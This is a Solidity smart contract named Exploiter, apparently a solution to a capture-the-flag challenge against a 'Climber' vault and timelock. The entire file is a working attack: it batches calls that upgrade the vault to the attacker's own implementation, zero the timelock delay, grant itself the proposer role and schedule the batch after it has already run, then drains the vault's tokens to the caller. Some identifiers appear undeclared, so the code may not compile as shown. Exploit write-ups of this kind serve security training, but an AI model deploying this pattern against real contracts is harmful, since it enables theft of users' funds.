// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./ClimberVault.sol";

contract Exploiter is UUPSUpgradeable {
    ClimberTimelock private immutable climberTimelock;
    ClimberVault private immutable climberVault;
    address immutable token;

    constructor(address payable _climberTimelockAddress, address _climberVaultAddress, address _token) {
        climberTimelock = ClimberTimelock(_climberTimelockAddress);
        climberVault = ClimberVault(_climberVaultAddress);
        token = _token;
    }

    function attack() external payable {
        address[] memory targets = new address[](4);
        uint256[] memory value = new uint256[](4);
        bytes[] memory data = new bytes[](4);

        // execute a tx to upgrade the contract implementation and call sweepFunds
        targets[0] = address(climberVault);
        data[0] = abi.encodeWithSelector(
            climberVault.upgradeToAndCall.selector,
            address(this),
            abi.encodeWithSelector(this.sweepFunds.selector, token)
        );

        // execute a tx to update delay to 0
        targets[1] = address(climberTimelock);
        data[1] = abi.encodeWithSelector(climberTimelock.updateDelay.selector, 0);

        // execute a tx to upgrade role to timelock contract
        targets[2] = address(climberTimelock);
        data[2] = abi.encodeWithSelector(climberTimelock.grantRole.selector, PROPOSER_ROLE, address(this));

        // execute a tx to schedule all txs
        targets[3] = address(this);
        data[3] = abi.encodeWithSelector(this.schedule.selector);

        // call execute function on timelock contract
        climberTimelock.execute(targets, value, data, 0);
    }

    function schedule() external {
        address[] memory targets = new address[](4);
        uint256[] memory value = new uint256[](4);
        bytes[] memory data = new bytes[](4);

        targets[0] = address(climberVault);
        data[0] = abi.encodeWithSelector(
            climberVault.upgradeToAndCall.selector,
            address(this),
            abi.encodeWithSelector(this.sweepFunds.selector, token)
        );

        targets[1] = address(climberTimelock);
        data[1] = abi.encodeWithSelector(climberTimelock.updateDelay.selector, 0);

        targets[2] = address(climberTimelock);
        data[2] = abi.encodeWithSelector(climberTimelock.grantRole.selector, PROPOSER_ROLE, address(this));

        targets[3] = address(this);
        data[3] = abi.encodeWithSelector(this.schedule.selector);

        climberTimelock.schedule(targets, value, data, 0);
    }

    function sweepFunds(address token) external {
        SafeTransferLib.safeTransfer(token, tx.origin, IERC20(token).balanceOf(address(this)));
    }

    function _authorizeUpgrade(address newImplementation) internal override {}
}
